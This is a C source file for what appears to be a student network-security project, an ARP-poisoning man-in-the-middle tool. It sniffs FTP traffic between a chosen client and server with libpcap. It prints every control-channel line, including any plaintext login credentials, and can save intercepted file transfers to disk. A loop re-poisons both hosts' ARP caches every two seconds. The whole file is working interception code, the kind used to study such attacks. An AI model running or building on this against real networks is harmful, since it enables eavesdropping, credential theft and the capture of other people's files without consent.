#include <inquisitor.h>
#include <libft.h>
#include <pcap.h>

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>
#include <limits.h>

#define	FILTER_BUFF_SIZE 256
#define	POISON_INTERVAL 2
#define	XFER_NAME_SIZE 256

typedef struct	s_capture_ctx {
	uint32_t	link_hdr_len;
	const char	*write_dir;				// -w target dir, NULL if disabled
	int			xfer_active;			// a data transfer is in progress
	char		xfer_name[XFER_NAME_SIZE];	// filename from RETR/STOR ("" for LIST)
	size_t		xfer_bytes;				// bytes seen on the data channel
	int			xfer_fd;				// open output file, -1 if not writing
}				t_capture_ctx;

static void build_ftp_filter(t_args *args, char buff[]) {
	char	src[INET_ADDRSTRLEN] = { 0 };
	char	dst[INET_ADDRSTRLEN] = { 0 };

	inet_ntop(AF_INET, &args->src_addr, src, sizeof(src));
	inet_ntop(AF_INET, &args->dst_addr, dst, sizeof(dst));
	snprintf(buff, FILTER_BUFF_SIZE,
		"(tcp port 20 or tcp port 21) and host %s and host %s", src, dst);
}

static int apply_filter(pcap_t *handle, const char filter_exp[]) {
	if (!filter_exp) {
		return (0);
	}
	if (!handle) {
		ERR("Invalid handle.\n");
		return (1);
	}
	struct bpf_program	fp;
	if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
		ERR("Couldn't parse filter `%s`: %s\n", filter_exp, pcap_geterr(handle));
		return (1);
	}
	if (pcap_setfilter(handle, &fp) == -1)
	{
		ERR( "Couldn't apply filter: %s\n", pcap_geterr(handle));
		pcap_freecode(&fp);
		return (1);
	}
	pcap_freecode(&fp);
	return (0);
}

static pcap_t	*create_pcap_handle(const char *filter_exp) {
	char	errbuf[PCAP_ERRBUF_SIZE] = { 0 };
	pcap_t	*handle = pcap_open_live(CAPTURE_DEVICE, BUFSIZ, 1, 1000, errbuf);

	if (!handle) {
		ERR("pcap_open_live(%s): %s\n", CAPTURE_DEVICE, errbuf);
		return (NULL);
	}
	DBG("Capture Filter: %s\n", filter_exp);
	if (apply_filter(handle, filter_exp)) {
		ERR("Failed to apply filter\n");
		pcap_close(handle);
		return (NULL);
	}

	if (pcap_setnonblock(handle, 1, errbuf) == -1) {
		ERR("pcap_setnonblock: %s\n", errbuf);
		pcap_close(handle);
		return (NULL);
	}
	return (handle);
}

static uint32_t link_header_len(int datalink) {
	switch (datalink) {
		case DLT_EN10MB:	return (14);
		case DLT_LINUX_SLL:	return (16);
#ifdef DLT_LINUX_SLL2
		case DLT_LINUX_SLL2:	return (20);
#endif
		default:		return (14);
	}
}

// Last path component, so a RETR/STOR path can't write outside write_dir.
static const char *ftp_basename(const char *name) {
	const char	*base = name;

	for (const char *p = name; *p; p++) {
		if (*p == '/')
			base = p + 1;
	}
	return (base);
}

// 3-digit FTP reply code at the start of a server line, or -1.
static int reply_code(const u_char *line, int len) {
	if (len < 3)
		return (-1);
	for (int i = 0; i < 3; i++) {
		if (line[i] < '0' || line[i] > '9')
			return (-1);
	}
	return ((line[0] - '0') * 100 + (line[1] - '0') * 10 + (line[2] - '0'));
}

// Flush the current transfer: report bytes, close the output file.
static void ftp_end_transfer(t_capture_ctx *ctx) {
	if (!ctx->xfer_active)
		return;
	INFO("[data] %zu bytes transferred (%s)\n",
		ctx->xfer_bytes, ctx->xfer_name[0] ? ctx->xfer_name : "listing");
	if (ctx->xfer_fd >= 0)
		close(ctx->xfer_fd);
	ctx->xfer_fd = -1;
	ctx->xfer_active = 0;
}

// A RETR/STOR/LIST started: arm counting, and open the output file if -w is on.
static void ftp_start_transfer(t_capture_ctx *ctx, const u_char *name, int namelen) {
	ftp_end_transfer(ctx);
	if (namelen < 0)
		namelen = 0;
	if (namelen > XFER_NAME_SIZE - 1)
		namelen = XFER_NAME_SIZE - 1;
	ft_memcpy(ctx->xfer_name, name, namelen);
	ctx->xfer_name[namelen] = '\0';
	ctx->xfer_bytes = 0;
	ctx->xfer_active = 1;
	ctx->xfer_fd = -1;

	if (ctx->write_dir && ctx->xfer_name[0]) {
		char	path[PATH_MAX];
		snprintf(path, sizeof(path), "%s/%s", ctx->write_dir, ftp_basename(ctx->xfer_name));
		ctx->xfer_fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
		if (ctx->xfer_fd < 0)
			ERR("Cannot open `%s`: %s\n", path, strerror(errno));
		else
			INFO("[data] writing to %s\n", path);
	}
}

static void handle_ftp_control(t_capture_ctx *ctx, const u_char *payload, int len, int from_server) {
	const u_char	*p = payload;
	const u_char	*end = payload + len;

	while (p < end) {
		const u_char	*nl = ft_memchr(p, '\n', end - p);
		const u_char	*line_end = nl ? nl : end;
		int				llen = (int)(line_end - p);

		if (llen > 0 && p[llen - 1] == '\r')
			llen--;
		if (llen > 0) {
			INFO("[21][%s]: %.*s\n", from_server ? "Server" : "Client", llen, p);
			if (from_server) {
				int code = reply_code(p, llen);
				if (ctx->xfer_active && (code == 226 || (code >= 400 && code < 600)))
					ftp_end_transfer(ctx);
			} else if (llen > 5 &&
				(ft_strncmp((char *)p, "RETR ", 5) == 0 ||
				 ft_strncmp((char *)p, "STOR ", 5) == 0)) {
				INFO("  -> file: %.*s\n", llen - 5, p + 5);
				ftp_start_transfer(ctx, p + 5, llen - 5);
			} else if (ft_strncmp((char *)p, "LIST", 4) == 0 ||
				ft_strncmp((char *)p, "NLST", 4) == 0) {
				ftp_start_transfer(ctx, (const u_char *)"", 0);
			}
		}
		if (!nl)
			break;
		p = nl + 1;
	}
}

// Data channel (port 20): count bytes, and write them out when -w is on.
static void handle_ftp_data(t_capture_ctx *ctx, const u_char *payload, int len) {
	if (!ctx->xfer_active)
		return;
	ctx->xfer_bytes += (size_t)len;
	if (ctx->xfer_fd >= 0 && write(ctx->xfer_fd, payload, len) < 0) {
		ERR("write: %s\n", strerror(errno));
		close(ctx->xfer_fd);
		ctx->xfer_fd = -1;
	}
}

static void handle_packet(u_char *user, const struct pcap_pkthdr *header, const u_char *packet) {
	t_capture_ctx	*ctx = (t_capture_ctx *)user;
	uint32_t		caplen = header->caplen;
	uint32_t		l3off = ctx->link_hdr_len;

	if (caplen < l3off + sizeof(struct iphdr))
		return;
	const struct iphdr	*ip = (const struct iphdr *)(packet + l3off);
	if (ip->version != 4 || ip->protocol != IPPROTO_TCP)
		return;
	uint32_t	ip_hl = (uint32_t)ip->ihl * 4;
	if (ip_hl < sizeof(struct iphdr) || caplen < l3off + ip_hl + sizeof(struct tcphdr))
		return;
	const struct tcphdr	*tcp = (const struct tcphdr *)((const u_char *)ip + ip_hl);
	uint32_t	tcp_hl = (uint32_t)tcp->th_off * 4;
	if (tcp_hl < sizeof(struct tcphdr))
		return;

	uint32_t	hdrs = l3off + ip_hl + tcp_hl;
	if (caplen <= hdrs)
		return;
	const u_char	*payload = packet + hdrs;
	int				payload_len = (int)(caplen - hdrs);

	uint16_t	sport = ntohs(tcp->th_sport);
	uint16_t	dport = ntohs(tcp->th_dport);
	if (sport == 21)
		handle_ftp_control(ctx, payload, payload_len, 1);
	else if (dport == 21)
		handle_ftp_control(ctx, payload, payload_len, 0);
	else if (sport == 20 || dport == 20)
		handle_ftp_data(ctx, payload, payload_len);
}

int	capture(t_args *args, libnet_t *l_client, libnet_t *l_server) {
	char	filter_buffer[FILTER_BUFF_SIZE] = { 0 };
	build_ftp_filter(args, filter_buffer);

	pcap_t	*handle = create_pcap_handle(filter_buffer);
	if (!handle) {
		return (1);
	}

	if (pcap_setdirection(handle, PCAP_D_IN) == -1)
		DBG("pcap_setdirection: %s\n", pcap_geterr(handle));

	int	fd = pcap_get_selectable_fd(handle);
	if (fd == -1) {
		ERR("pcap_get_selectable_fd: not supported on this device\n");
		pcap_close(handle);
		return (1);
	}

	if (args->write_dir && mkdir(args->write_dir, 0755) < 0 && errno != EEXIST) {
		ERR("Cannot create directory `%s`: %s\n", args->write_dir, strerror(errno));
		pcap_close(handle);
		return (1);
	}

	t_capture_ctx	ctx = {
		.link_hdr_len = link_header_len(pcap_datalink(handle)),
		.write_dir = args->write_dir,
		.xfer_active = 0,
		.xfer_fd = -1,
	};
	time_t			last_poison = 0;

	while (1) {
		struct pollfd	pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
		poll(&pfd, 1, 1000);
		pcap_dispatch(handle, -1, handle_packet, (u_char *)&ctx);

		if (time(NULL) - last_poison >= POISON_INTERVAL) {
			send_arp(l_client, "client");
			send_arp(l_server, "server");
			last_poison = time(NULL);
		}
	}
	pcap_close(handle);
	return (0);
}
